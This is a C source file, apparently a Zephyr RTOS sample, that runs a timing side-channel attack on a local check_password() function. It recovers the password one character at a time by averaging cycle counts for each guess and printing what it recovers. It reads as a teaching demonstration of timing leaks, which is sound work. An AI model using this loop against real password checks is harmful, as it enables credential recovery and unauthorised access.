/*
 * Copyright (c) 2026 Sean Kyer
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <string.h>
#include <stdint.h>

#include "password.h"

#define MAX_PASSWORD_LEN   64
#define NUM_SAMPLES        20

static inline uint64_t timestamp_now(void)
{
	return k_cycle_get_64();
}

static uint64_t measure_guess(const char *guess)
{
	uint64_t start = timestamp_now();

	check_password(guess);
	uint64_t end = timestamp_now();

	return end - start;
}

static const char charset[] =
	"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+";

int main(void)
{
	printk("Starting timing side-channel attack...\n");

	char recovered[MAX_PASSWORD_LEN] = {0};
	char test[MAX_PASSWORD_LEN] = {0};

	size_t recovered_len = 0;
	size_t charset_len = strlen(charset);

	for (size_t pos = 0; pos < MAX_PASSWORD_LEN - 1; pos++) {
		uint64_t best_time = 0;
		char best_char = 0;
		bool found_any = false;

		for (size_t c = 0; c < charset_len; c++) {
			memcpy(test, recovered, recovered_len);
			test[recovered_len] = charset[c];
			test[recovered_len + 1] = '\0';

			uint64_t total = 0;

			for (int i = 0; i < NUM_SAMPLES; i++) {
				total += measure_guess(test);
			}

			uint64_t avg = total / NUM_SAMPLES;

			/*
			 * If this character took longer to process than the others, then it
			 * must be the next correct character.
			 */
			if (!found_any || avg > best_time) {
				best_time = avg;
				best_char = charset[c];
				found_any = true;
			}
		}

		printk("found pos %d try %c -> %llu cycles\n", recovered_len, best_char, best_time);

		recovered[recovered_len++] = best_char;
		recovered[recovered_len] = '\0';

		printk("Recovered so far: %s\n", recovered);

		/* stop when correct full string found */
		if (check_password(recovered)) {
			printk("Final password recovered: %s\n", recovered);
			break;
		}

		k_sleep(K_MSEC(250));
	}

	printk("Attack sample finished.\n");

	return 0;
}
